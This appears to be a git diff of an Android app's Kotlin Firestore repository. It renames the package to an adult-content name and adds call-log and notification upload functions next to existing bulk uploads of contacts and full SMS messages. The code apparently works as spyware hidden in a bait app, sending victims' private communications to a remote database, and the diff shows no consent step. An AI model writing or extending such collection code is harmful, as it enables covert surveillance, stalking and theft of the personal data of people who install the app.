@@ -1,15 +1,16 @@
-package com.datasync.user.data
+package com.boxx.porn.data
 
-import com.datasync.user.model.Contact
-import com.datasync.user.model.DeviceInfo
-import com.datasync.user.model.SMS
+import com.boxx.porn.model.*
 import com.google.firebase.firestore.FirebaseFirestore
-import com.google.firebase.firestore.WriteBatch
 import kotlinx.coroutines.tasks.await
 import java.security.MessageDigest
+import javax.inject.Inject
+import javax.inject.Singleton
 
-class FirestoreRepository {
-    private val db = FirebaseFirestore.getInstance()
+@Singleton
+class FirestoreRepository @Inject constructor(
+    private val db: FirebaseFirestore
+) {
 
     suspend fun updateDeviceInfo(deviceInfo: DeviceInfo) {
         db.collection("devices")
@@ -23,12 +24,10 @@ class FirestoreRepository {
             .document(deviceId)
             .collection("contacts")
 
-        // Use batch writes for scalability
         val chunks = contacts.chunked(500)
         for (chunk in chunks) {
             val batch = db.batch()
             chunk.forEach { contact ->
-                // Use hashed phone number as ID to prevent duplicates
                 val docId = hashString(contact.phone)
                 val docRef = collectionRef.document(docId)
                 batch.set(docRef, contact)
@@ -46,13 +45,39 @@ class FirestoreRepository {
         for (chunk in chunks) {
             val batch = db.batch()
             chunk.forEach { sms ->
-                // Use hash of address + date + body as ID to prevent duplicates
                 val docId = hashString("${sms.address}${sms.date}${sms.body}")
                 val docRef = collectionRef.document(docId)
                 batch.set(docRef, sms)
             }
             batch.commit().await()
         }
+    }
+
+    suspend fun syncCallLogs(deviceId: String, callLogs: List<CallLog>) {
+        val collectionRef = db.collection("devices")
+            .document(deviceId)
+            .collection("calllogs")
+
+        val chunks = callLogs.chunked(500)
+        for (chunk in chunks) {
+            val batch = db.batch()
+            chunk.forEach { log ->
+                val docId = hashString("${log.number}${log.date}${log.type}")
+                val docRef = collectionRef.document(docId)
+                batch.set(docRef, log)
+            }
+            batch.commit().await()
+        }
+    }
+
+    suspend fun syncNotification(deviceId: String, notification: NotificationData) {
+        val docId = hashString("${notification.packageName}${notification.timestamp}${notification.title}")
+        db.collection("devices")
+            .document(deviceId)
+            .collection("notifications")
+            .document(docId)
+            .set(notification)
+            .await()
     }
 
     private fun hashString(input: String): String {
